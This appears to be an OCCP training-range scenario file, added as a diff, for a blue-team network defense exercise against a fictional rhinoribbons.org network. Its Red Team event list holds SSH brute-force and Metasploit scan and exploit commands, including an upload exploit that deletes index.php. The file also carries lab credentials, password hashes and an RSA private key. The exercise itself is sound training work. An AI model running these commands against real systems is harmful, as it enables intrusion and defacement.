@@ -1,0 +1,476 @@
+<?xml version="1.0" encoding="UTF-8"?><occpchallenge>
+    <!-- You should change this password-->
+  
+  
+
+  
+  
+  
+
+  <!-- root's password is meant to be found not cracked -->
+  
+
+  <!-- The admin's login info -->
+  
+  
+  
+
+  <!-- These are for "known" email accounts i.e. not random names/passwords -->
+  
+  
+  
+
+  
+
+  <!-- Randomized email usernames and passwords -->
+  
+  
+
+  <!-- Randomized volunteers -->
+  
+  
+
+  <!-- Various server hostnames -->
+  
+  
+  
+  
+  
+
+  
+
+  <!-- Networking Settings -->
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+
+  <!-- Randomize the various server IP addresses -->
+  
+  
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+  <!-- Parallel arrays of hostnames and IPs for the company's DNS to resolve -->
+  <!-- Note: the mail server is handled another way and should NOT be added here -->
+  
+  
+
+  <!-- Describes the global DNS for those outside the company network using the OCCP router's DNS -->
+  <rootdns>
+    <entry name="rhinoribbons.org" rrtype="CNAME" value="www.rhinoribbons.org"/>
+    <entry name="www.rhinoribbons.org" rrtype="A" value="185.110.107.36"/>
+    <entry name="mail.rhinoribbons.org" rrtype="A" value="185.110.107.129"/>
+    <entry name="rhinoribbons.org" rrtype="MX" value="mail.rhinoribbons.org"/>
+  </rootdns>
+
+  <network label="companydmz"/>
+  <network label="companylan"/>
+  <host basevm="Ubuntu_14.04_32bit" domain="rhinoribbons.org" hostname="mail" label="rhinomail" phase="1" ram="512">
+    <interface broadcast="10.0.0.255" config="static" gateway="185.110.107.1" ipv4="185.110.107.129/24" name="eth0" network="companydmz"/>
+    <content>
+      <pack config="updater" name="occputils"/>
+      <pack config="sshhostregen" name="occputils"/>
+      <pack name="rhinomachines">
+        <root_password>'$6$0NWG4urk$gZ70miw1qOn7.EB00p6IfwZ1QQNmJ2D5r1LDD4ct/K8kxWEL9VFCm5B2jXyw3ZYSnPzhb7b8lqEDMS2ajuj.8.'</root_password>
+        <admin_username>'admin'</admin_username>
+        <admin_password>'$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.'</admin_password>
+        <password_authentication_network>'10.0.0.0/24'</password_authentication_network>
+        <regenerate_snakeoil>true</regenerate_snakeoil>
+        <install_fail2ban>true</install_fail2ban>
+      </pack>
+      <pack config="server" name="refvsnmail">
+        <mail_domain>'rhinoribbons.org'</mail_domain>
+        <mysql_email_db_password>'RpHodz3c'</mysql_email_db_password>
+        <virtual_usernames>['admin',]</virtual_usernames>
+        <virtual_passwords>['$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.',]</virtual_passwords>
+        <random_virtual_usernames>['hshuck','mbetances','dfreitas','szamudio','amarte','lchrysler','mathey',]</random_virtual_usernames>
+        <random_virtual_passwords>['$1$5T37GE6z$m67WPSSRgmxZOV7p6HaF41','$1$fg6LCG4b$HiIRuBLR0VXdsZzz9mwwp0','$1$xxCuIIhe$BgooVLvbP68iQLs13v9t4/','$1$FeITVFeb$Ij1cTpkLz3n3cOImq40Fs1','$1$jmcECgZM$w5Ta4zR7F.rbZFGUGFIMk.','$1$f/Fe7eMs$KLwOnqJ1is/.W6QGTWuXf.','$1$WAlQpe/D$vmJUV0ZiZBlHPSK96ICUN0',]</random_virtual_passwords>
+        <mysql_password_scheme>'MD5'</mysql_password_scheme>
+        <db_ip>'10.0.0.16'</db_ip>
+      </pack>
+    </content>
+  </host>
+  <host basevm="Ubuntu_14.04_32bit" domain="rhinoribbons.org" hostname="www" label="rhinowww" phase="1" ram="512">
+    <interface broadcast="10.0.0.255" config="static" gateway="185.110.107.1" ipv4="185.110.107.36/24" name="eth0" network="companydmz"/>
+    <content>
+      <pack config="updater" name="occputils"/>
+      <pack config="sshhostregen" name="occputils"/>
+      <pack name="rhinomachines">
+        <root_password>'$6$0NWG4urk$gZ70miw1qOn7.EB00p6IfwZ1QQNmJ2D5r1LDD4ct/K8kxWEL9VFCm5B2jXyw3ZYSnPzhb7b8lqEDMS2ajuj.8.'</root_password>
+        <admin_username>'admin'</admin_username>
+        <admin_password>'$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.'</admin_password>
+        <permit_root_ssh_login>'no'</permit_root_ssh_login>
+        <other_usernames>['hshuck','mbetances','dfreitas','szamudio','amarte','lchrysler','mathey',]</other_usernames>
+        <other_passwords>['$1$5T37GE6z$m67WPSSRgmxZOV7p6HaF41','$1$fg6LCG4b$HiIRuBLR0VXdsZzz9mwwp0','$1$xxCuIIhe$BgooVLvbP68iQLs13v9t4/','$1$FeITVFeb$Ij1cTpkLz3n3cOImq40Fs1','$1$jmcECgZM$w5Ta4zR7F.rbZFGUGFIMk.','$1$f/Fe7eMs$KLwOnqJ1is/.W6QGTWuXf.','$1$WAlQpe/D$vmJUV0ZiZBlHPSK96ICUN0',]</other_passwords>
+        <install_fail2ban>true</install_fail2ban>
+      </pack>
+      <pack name="rhinowww">
+        <db_server_ip>'10.0.0.16'</db_server_ip>
+        <mysql_root_password>'X58bQfDI37'</mysql_root_password>
+      </pack>
+    </content>
+  </host>
+  <host basevm="Ubuntu_14.04_32bit" domain="rhinoribbons.org" hostname="fw" label="rhinofw" phase="1" ram="512">
+    <interface config="static" gateway="185.110.106.1" ipv4="185.110.106.2/30" name="eth0" network="fake-internet">
+      <route subnet="185.110.107.0/24"/>
+    </interface>
+    <interface broadcast="10.0.0.255" config="static" ipv4="10.0.0.1/24" name="eth1" network="companylan"/>
+    <interface broadcast="185.110.107.255" config="static" ipv4="185.110.107.1/24" name="eth2" network="companydmz"/>
+    <content>
+      <pack config="updater" name="occputils"/>
+      <pack config="sshhostregen" name="occputils"/>
+      <pack name="rhinomachines">
+        <root_password>'$6$0NWG4urk$gZ70miw1qOn7.EB00p6IfwZ1QQNmJ2D5r1LDD4ct/K8kxWEL9VFCm5B2jXyw3ZYSnPzhb7b8lqEDMS2ajuj.8.'</root_password>
+        <admin_username>'admin'</admin_username>
+        <admin_password>'$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.'</admin_password>
+        <sshd_listen>'10.0.0.1'</sshd_listen>
+        <install_fail2ban>true</install_fail2ban>
+      </pack>
+      <pack name="rhinofirewall">
+        <mail_db_ip>'10.0.0.16'</mail_db_ip>
+        <mail_db_port>['3306']</mail_db_port>
+        <mail_server_ip>'185.110.107.129'</mail_server_ip>
+        <db_server_ip>'10.0.0.16'</db_server_ip>
+        <www_server_ip>'185.110.107.36'</www_server_ip>
+      </pack>
+      <pack name="refvsndhcp">
+        <domain>'rhinoribbons.org'</domain>
+        <lan_subnet>'10.0.0.0'</lan_subnet>
+        <lan_netmask>'255.255.255.0'</lan_netmask>
+        <lan_routers>['10.0.0.1']</lan_routers>
+        <lan_broadcast>'10.0.0.255'</lan_broadcast>
+        <lan_dns>['10.0.0.1']</lan_dns>
+        <lan_range_begin>'10.0.0.100'</lan_range_begin>
+        <lan_range_end>'10.0.0.200'</lan_range_end>
+        <dmz_subnet>'185.110.107.0'</dmz_subnet>
+        <dmz_netmask>'255.255.255.0'</dmz_netmask>
+        <dmz_routers>['185.110.107.1']</dmz_routers>
+        <dmz_broadcast>'185.110.107.255'</dmz_broadcast>
+        <dmz_dns>['185.110.107.1']</dmz_dns>
+        <dmz_range_begin>'185.110.107.250'</dmz_range_begin>
+        <dmz_range_end>'185.110.107.254'</dmz_range_end>
+      </pack>
+      <pack name="refvsndns">
+        <domain>'rhinoribbons.org'</domain>
+        <reverse_zone>'107.110.185.IN-ADDR.ARPA'</reverse_zone>
+        <mail_IP>'185.110.107.129'</mail_IP>
+        <host_names>['www','db','fileserver',]</host_names>
+        <host_IPs>['185.110.107.36','10.0.0.16','10.0.0.37',]</host_IPs>
+      </pack>
+    </content>
+  </host>
+  <host basevm="Ubuntu_14.04_32bit" domain="rhinoribbons.org" hostname="db" label="rhinodb" phase="1" ram="512">
+    <interface broadcast="10.0.0.255" config="static" gateway="10.0.0.1" ipv4="10.0.0.16/24" name="eth0" network="companylan"/>
+    <content>
+      <pack config="updater" name="occputils"/>
+      <pack config="sshhostregen" name="occputils"/>
+      <pack name="rhinomachines">
+        <root_password>'$6$0NWG4urk$gZ70miw1qOn7.EB00p6IfwZ1QQNmJ2D5r1LDD4ct/K8kxWEL9VFCm5B2jXyw3ZYSnPzhb7b8lqEDMS2ajuj.8.'</root_password>
+        <admin_username>'admin'</admin_username>
+        <admin_password>'$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.'</admin_password>
+      </pack>
+      <pack name="rhinodb">
+        <mysql_root_password>'X58bQfDI37'</mysql_root_password>
+        <volunteer_first>['Allen','Tracey','Paula','Gordon','Milton','Wade','Janie','Fernando','Ricky','Patti','Judy','Marcus','Samantha','Gregg','Ginger','Amber','Dwayne','Herman','Jaime','Ryan',]</volunteer_first>
+        <volunteer_last>['Cunningham','Goodman','Carr','Holloway','Leonard','Gross','Lambert','Graham','Campbell','Griffin','Floyd','Sanchez','Stevens','Allison','Webster','Washington','Ball','Wheeler','Graves','Mann',]</volunteer_last>
+        <volunteer_phone>['4025558235','5175559623','8025550986','4065555632','8505550417','9075552573','5015556126','8045558877','8025555467','4015556444','3855552121','6025553924','6015558372','9195555976','6095550953','5175555976','5175558486','5015558591','4065554431','4025550638',]</volunteer_phone>
+      </pack>
+      <pack config="db" name="refvsnmail">
+        <mail_domain>'rhinoribbons.org'</mail_domain>
+        <mysql_email_db_password>'RpHodz3c'</mysql_email_db_password>
+        <virtual_usernames>['admin',]</virtual_usernames>
+        <virtual_passwords>['$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.']</virtual_passwords>
+        <random_virtual_usernames>['hshuck','mbetances','dfreitas','szamudio','amarte','lchrysler','mathey',]</random_virtual_usernames>
+        <random_virtual_passwords>['$1$5T37GE6z$m67WPSSRgmxZOV7p6HaF41','$1$fg6LCG4b$HiIRuBLR0VXdsZzz9mwwp0','$1$xxCuIIhe$BgooVLvbP68iQLs13v9t4/','$1$FeITVFeb$Ij1cTpkLz3n3cOImq40Fs1','$1$jmcECgZM$w5Ta4zR7F.rbZFGUGFIMk.','$1$f/Fe7eMs$KLwOnqJ1is/.W6QGTWuXf.','$1$WAlQpe/D$vmJUV0ZiZBlHPSK96ICUN0',]</random_virtual_passwords>
+        <mysql_password_scheme>'MD5'</mysql_password_scheme>
+        <db_ip>'10.0.0.16'</db_ip>
+        <install_software>false</install_software>
+      </pack>
+    </content>
+  </host>
+  <host basevm="Ubuntu_14.04_32bit" domain="rhinoribbons.org" hostname="fileserver" label="rhinofileserver" phase="1" ram="512">
+    <interface broadcast="10.0.0.255" config="static" gateway="10.0.0.1" ipv4="10.0.0.37/24" name="eth0" network="companylan"/>
+    <content>
+      <pack config="updater" name="occputils"/>
+      <pack config="sshhostregen" name="occputils"/>
+      <pack name="rhinomachines">
+        <root_password>'$6$0NWG4urk$gZ70miw1qOn7.EB00p6IfwZ1QQNmJ2D5r1LDD4ct/K8kxWEL9VFCm5B2jXyw3ZYSnPzhb7b8lqEDMS2ajuj.8.'</root_password>
+        <admin_username>'admin'</admin_username>
+        <admin_password>'$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.'</admin_password>
+      </pack>
+      <pack name="rhinofileserver">
+        <flag_variables>['327a6c4304ad5938eaf0efb6cc3e53dc',]</flag_variables>
+      </pack>
+    </content>
+  </host>
+  <host basevm="Ubuntu_14.04_32bit" domain="rhinoribbons.org" hostname="player" label="rhinoblue" phase="1" ram="2048">
+    <interface config="dhcp" name="eth0" network="companylan"/>
+    <content>
+      <pack config="sshhostregen" name="occputils"/>
+      <pack name="lubuntuplayer">
+        <admin_username>'admin'</admin_username>
+        <admin_password>'$1$msU13qN.$YdmxWKEAiDe0LuPmdXpU2.'</admin_password>
+        <instruction_report>'Instructions.txt'</instruction_report>
+        <public_key>'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDDjKxwdv3E1WjnGOGYl0cZdtjMOF68BFqFYa9SmpR7eLRNrwjbuvePmb/mOglptMx3uMuMqhcH3HMJN6gJa65l8vIa+MDFvHX+WBK1DiwUeUjj5YqtJHNIItkWTyKcsIC2s/hHRyD0qF/a3r8jSGQ+7J+8V/XUtdg0EPrKHMHZsw== 
+'</public_key>
+        <private_key>'-----BEGIN RSA PRIVATE KEY-----
+MIICWwIBAAKBgQDDjKxwdv3E1WjnGOGYl0cZdtjMOF68BFqFYa9SmpR7eLRNrwjb
+uvePmb/mOglptMx3uMuMqhcH3HMJN6gJa65l8vIa+MDFvHX+WBK1DiwUeUjj5Yqt
+JHNIItkWTyKcsIC2s/hHRyD0qF/a3r8jSGQ+7J+8V/XUtdg0EPrKHMHZswIDAQAB
+AoGAbsMCdV1g1hnPJn7YYXbmZc0EdYBEYJjSsRQom1BFZD51Wj8XdGZNjQAYSw56
+gG5RFksMuGsrSl+apRDqVBOzHrruP/709fbL5meNcu7QkeoOfUm/S8z2x1/akWo2
+vhENy4BMs9oUgYAHd0xWeoUL648r2WQfRlu35+Bjak7fayECQQD5Vvx9lBuHGBiN
+Bo5kMGnOGB83IXDNnDfW/Dm/FDa5Kff4+OOCFSITn+BFhlkcFWA+YpGstfW15l+L
+e4H60TEDAkEAyMXc/ejAAK3zAqdkS4UkBQ3kF7UpMW/mCbaT91ePVsBDM7zfjBRp
+VPj5oKMQT/kaOuh/ATqSRVdJD6ZrtX1dkQJAVFvOzzn12k4XuFb4hAMxOO5GWWOy
+A46QAeeSLgjLvvfpEs46Qv+daOBVg5BBw9OjnVfCC5oAiMtplgpyXoa6OwJAMVWt
+gBb5VzFnTXekhYop17QaIFk7zhIZDLn4kgbKCh8kZEo9BEbfuymS7Y4kLAKiF2ea
+Dcs+thtEsLvMK8SqgQJAa4JfXoVMD2tqOIO27JNSVl4rQtbUGfsy0qyhQX4Pwuzs
+AcmdAf7kKELcL81Zg+usVVemtRLIAsaWVb/Zm2uKEA==
+-----END RSA PRIVATE KEY-----
+'</private_key>
+      </pack>
+    </content>
+  </host>
+  <host basevm="Ubuntu_12.04_32bit" clones="0" hostname="GameServer" label="gameserver" phase="1">
+    <!-- This interface must be exactly this value -->
+    <interface broadcast="14.16.19.255" config="static" gateway="14.16.19.1" ipv4="14.16.19.2/24" name="eth0" network="fake-internet" nic="0"/>
+    <content>
+      <pack name="gameserver">
+        <moderator_username>'moderator'</moderator_username>
+        <moderator_password>'$6$HjbPGfbf$mjGXpkFJK1AfVGLpAOEL1eqUlEt8GQw2NKFCp9nidSVMt9AlPFyKK9I7KRp8LqXRe9BgLQX7sTQyrikL2hnvg0'</moderator_password>
+        <dnsserver_ip>'14.16.19.1'</dnsserver_ip>
+      </pack>
+    </content>
+  </host>
+  <!-- Describe the current scenario; instance data can ovveride this section -->
+  <scenario description="Blue team defends the network against automated Red team attacks." gameid="1" name="Network Defense Example" type="Network Defense">
+    <!-- Length of time to run this scenario -->
+    <length format="minutes" time="60"/>
+
+    <!-- UNUSED Recommended virtual target network -->
+    <networkid number="1"/>
+
+    <users>
+      <user name="moderator" pass="token"/>
+      <user name="blueplayer" pass="token"/>
+      <user name="spectator" pass="token"/>
+    </users>
+
+    <!-- When a user logs in to the system the components that are displayed are
+      defined in these sections -->
+    <user-interfaces>
+      <user-interface name="spectator-ui" show-other-controls="false" show-scoreboard="true" show-teams-all="false">
+        <scoreboard name="spectator-board"/>
+        <permitted-users>
+          <user name="spectator"/>
+        </permitted-users>
+      </user-interface>
+      <user-interface name="moderator-ui" show-other-controls="true" show-scoreboard="true" show-teams-all="true">
+        <scoreboard name="moderator-board"/>
+        <permitted-users>
+          <user name="moderator"/>
+        </permitted-users>
+      </user-interface>
+    </user-interfaces>
+
+    <!-- Score groups labels allow certain events to be grouped together for score calculation -->
+    <score-labels>
+      <score-label name="blueteam5min" sql="select SUM(value) from score where groupname='blueteam_service' AND (time &gt; (strftime('%s', 'now') - 300))"/>
+      <score-label name="blueteam_service"/>
+      <score-label name="redteam"/>
+    </score-labels>
+
+    <score-names>
+      <!-- score names are treated as ERB templates; use score labels as variables in calculation-->
+      <score-name descr="Blue Team" formula="blueteam_service - redteam" name="blue-team"/>
+      <score-name descr="Red Team" formula="redteam" name="red-team"/>
+      <score-name descr="Service Level" formula="blueteam_service" name="service-level"/>
+      <score-name descr="Service Level (Last 5 minute)" formula="blueteam5min" name="service-level-5"/>
+    </score-names>
+
+    <!-- Scoreboard show a particular calculation of a group of scores -->
+    <scoreboards>
+      <scoreboard name="moderator-board" update-rate="live">
+        <score-name name="blue-team"/>
+        <score-name name="service-level"/>
+      </scoreboard>
+      <scoreboard name="spectator-board" update-rate="live">
+        <score-name name="blue-team"/>
+        <score-name name="service-level"/>
+      </scoreboard>
+      <scoreboard name="player-board" update-rate="1min">
+        <score-name name="blue-team"/>
+        <score-name name="service-level"/>
+      </scoreboard>
+    </scoreboards>
+  </scenario>
+
+  <ip-pools>
+    <pool cidr="24" gateway="" name="hacker" network="fake-internet">
+      <address type="list">144.169.196.2</address>
+    </pool>
+    <pool cidr="8" name="hacker-botnet" network="fake-internet">
+      <address addr="41.0.0.0/8" count="9" select="asc" type="range"/>
+      <address addr="48.0.0.0/8" count="9" select="asc" type="range"/>
+      <address addr="51.0.0.0/8" count="9" select="asc" type="range"/>
+    </pool>
+    <pool cidr="8" name="grey" network="fake-internet">
+      <address addr="16.0.0.0/8" count="9" select="asc" type="range"/>
+      <address addr="24.0.0.0/8" count="9" select="asc" type="range"/>
+      <address addr="48.0.0.0/8" count="9" select="asc" type="range"/>
+    </pool>
+  </ip-pools>
+
+  <!-- NOT USED, RESERVED FOR FEDERATION.
+    Identify each location that team processes will execute.
+    Each of these locations needs to be contacted to dispatch the appropriate team code to.
+    These hosts need to specified in the host section.
+    <team-hosts>
+      <team-host name="Local"
+          hostname="localhost"
+          ip-addr="127.0.0.1"
+          port="24365" />
+      </team-hosts> -->
+
+  <!-- Identify the handlers needed to run events -->
+  <event-handlers>
+    <handler class-handler="ExecHandler" name="exec-handler-1"/>
+    <handler class-handler="MetasploitHandler" name="metasploit-handler-1" server-hostname="host1" server-ip="" server-port=""/>
+  </event-handlers>
+
+  <team name="Grey Team">
+    <!-- Identifies the name of the location to dispatch this team to -->
+    <team-host hostname="localhost"/>
+    <!-- Rate at which events are executed from the event list -->
+    <speed factor="1.0"/>
+
+    <team-event-list>
+        <team-event command="ping -c 2 185.110.107.129" drift="3" endtime="9999999" frequency="2" guid="" handler="exec-handler-1" id="" ipaddress="grey" name="Ping Test" starttime="0">
+            <score-atomic points="5" score-group="blueteam_service" when="success"/>
+            <score-atomic points="-3" score-group="blueteam_service" when="fail"/>
+        </team-event>
+        <team-event command="wget -q --random-wait --wait 5 --limit-rate=30k --directory-prefix /tmp/site --delete-after --mirror --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36' http://185.110.107.36/" drift="8" endtime="9999999" frequency="30" guid="" handler="exec-handler-1" id="" ipaddress="grey" name="Web Test" starttime="0">
+            <score-atomic points="5" score-group="blueteam_service" when="success"/>
+            <score-atomic points="-3" score-group="blueteam_service" when="fail"/>
+        </team-event>
+        <team-event command="echo &quot;['hshuck','mbetances','dfreitas','szamudio','amarte','lchrysler','mathey',]&quot; |  sendmail.py 185.110.107.129 rhinoribbons.org" drift="90" endtime="9999999" frequency="60" guid="" handler="exec-handler-1" id="" ipaddress="grey" name="Email Grey" starttime="0">
+            <score-atomic points="5" score-group="blueteam_service" when="success"/>
+            <score-atomic points="-3" score-group="blueteam_service" when="fail"/>
+        </team-event>
+    </team-event-list>
+  </team>
+  <team name="Red Team">
+    <!-- Identifies the name of the location to dispatch this team to -->
+    <team-host hostname="localhost"/>
+
+    <!-- Rate at which events are executed from the event list -->
+    <speed factor="1.0"/>
+
+    <!-- Parent block for events in this teams event list -->
+    <team-event-list>
+      <!-- template
+        <team-event name="" id="" guid="" handler="exec-handler-1"  ipaddress=""
+            starttime="0" endtime="9999999" frequency="2" drift="0"
+            command="">
+          <score-atomic when="success" score-group="blueteam_service" points="5" />
+            <score-atomic when="fail" score-group="blueteam_service" points="-3" />
+            </team-event>
+          -->
+      <team-event command="cat /usr/share/dict/words | /usr/games/random $(wc -l /usr/share/dict/words | cut -f 1 -d ' ') | /usr/bin/sshaskpass.sh ssh -o numberofpasswordprompts=1 -o stricthostkeychecking=no 185.110.107.129 /bin/true" drift="0" endtime="9999999" frequency="2" guid="" handler="exec-handler-1" id="" ipaddress="hacker" name="SSH Root Brute" starttime="300">
+        <score-atomic points="5" score-group="blueteam_service" when="success"/>
+        <score-atomic points="-3" score-group="blueteam_service" when="fail"/>
+      </team-event>
+      <!-- Note that some Metasploit returns unreliable results, so we always return true -->
+      <team-event command="/opt/metasploit-framework/msfcli auxiliary/scanner/http/crawler RHOST=185.110.107.36 E; /bin/true" drift="30" endtime="9999999" frequency="420" guid="" handler="exec-handler-1" id="" ipaddress="hacker-botnet" name="http crawl" starttime="480">
+      </team-event>
+      <team-event command="/opt/metasploit-framework/msfcli auxiliary/scanner/http/brute_dirs RHOSTS=185.110.107.36 PATH=/volunteer.php QUERY=first=a  E; /bin/true" drift="20" endtime="9999999" frequency="300" guid="" handler="exec-handler-1" id="" ipaddress="hacker-botnet" name="brute dir scan " starttime="600">
+      </team-event>
+      <team-event command="/opt/metasploit-framework/msfcli unix/webapp/egallery_upload_exec RHOST=185.110.107.36 TARGETURI=/rhinos/ C" drift="90" endtime="9999999" frequency="700" guid="" handler="exec-handler-1" id="" ipaddress="hacker-botnet" name="egallery check" starttime="700">
+      </team-event>
+      <team-event command="/opt/metasploit-framework/msfcli unix/webapp/egallery_upload_exec RHOST=185.110.107.36 TARGETURI=/rhinos/ PAYLOAD=php/exec CMD=&quot;rm index.php&quot; E" drift="100" endtime="9999999" frequency="900" guid="" handler="exec-handler-1" id="" ipaddress="hacker" name="egallery deface" starttime="900">
+        <score-atomic points="5" score-group="redteam" when="success"/>
+        <score-atomic points="-3" score-group="redteam" when="fail"/>
+      </team-event>
+      <team-event command="/opt/metasploit-framework/msfcli auxiliary/scanner/http/blind_sql_query RHOSTS=185.110.107.36 PATH=/volunteer.php QUERY=first=a  E; /bin/true" drift="60" endtime="9999999" frequency="500" guid="" handler="exec-handler-1" id="" ipaddress="hacker-botnet" name="volunteer scan" starttime="540">
+      </team-event>
+    </team-event-list>
+  </team>
+<report name="Instructions.txt">
+    Congratulations! You are now responsible for rhinoribbons.org, here are your credentials: admin:Rhin0s
+
+    Machines in the network:
+      External:
+        Web: www.rhinoribbons.org - 185.110.107.36
+        Mail: mail.rhinoribbons.org - 185.110.107.129
+      Internal:
+        Database: db.rhinoribbons.org - 10.0.0.16
+        File server: fileserver.rhinoribbons.org - 10.0.0.37
+      Border:
+        Firewall: fw.rhinoribbons.org - 185.110.106.2, 10.0.0.1, 185.110.107.1
+
+    There is a backup of the website in root's home directory on www.rhinoribbons.org
+
+    You should complete the following before the close of business today:
+      1) Setup your email client and check it often. There may be important emails that you will need to attend to.
+      2) Ensure the firewall is properly configured such that only absolutely required traffic can get from the DMZ to the LAN
+      3) Ensure all external servers are safe from SSH brute force attacks. Policy change is at your discretion.
+      4) Inspect your network for any additional flaws or poor security practices and take appropriate action or report your findings.
+
+    Configuring your email client:
+    1) Open Thunderbird and press "Skip this and use my existing email"
+    2) Enter your name
+       email: admin@rhinoribbons.org
+       password: Rhin0s
+       Press continue then manual config
+    3) Use mail.rhinoribbons.org for both the incoming and and outgoing server hostname and choose re-test.
+    4) Press Done. Confirm any security exception notices that pop up, we were too cheap to pay for a proper SSL certificate.
+
+</report>
+<report name="Moderator.txt">
+Machines:
+  External:
+    Web: www.rhinoribbons.org - 185.110.107.36
+    Mail: mail.rhinoribbons.org - 185.110.107.129
+  Internal:
+    Database: db.rhinoribbons.org - 10.0.0.16
+    File server: fileserver.rhinoribbons.org - 10.0.0.37
+  Border:
+    Firewall: fw.rhinoribbons.org - 185.110.106.2, 10.0.0.1, 185.110.107.1
+
+Credentials:
+    root:X58bQfDI37
+    admin:Rhin0s
+
+Email Accounts:
+    ['admin',]
+    ['Rhin0s',]
+Random Email Accounts:
+    ['hshuck','mbetances','dfreitas','szamudio','amarte','lchrysler','mathey',]
+    ['qwerty','test','killer','654321','love','123456789','dallas',]
+</report>
+</occpchallenge>
